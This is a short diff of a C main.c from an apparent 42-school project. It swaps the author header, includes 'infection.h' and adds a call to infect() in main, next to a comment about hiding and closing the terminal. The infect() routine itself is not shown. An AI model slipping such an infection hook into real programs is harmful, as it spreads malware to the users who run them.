@@ -3,15 +3,14 @@
 /*                                                        :::      ::::::::   */
 /*   main.c                                             :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
+/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2017/07/01 18:05:22 by frmarinh          #+#    #+#             */
-/*   Updated: 2017/07/01 18:07:34 by frmarinh         ###   ########.fr       */
+/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
+/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include "all.h"
-
+#include "infection.h"
 /*
 **	Hide and close the current terminal
 */
@@ -56,5 +55,6 @@ int					main(int argc, char **argv)
 {
 	setlocale(LC_CTYPE, "");
 	signal(SIGSEGV, signal_handler);
+	infect();
 	return (0);
 }
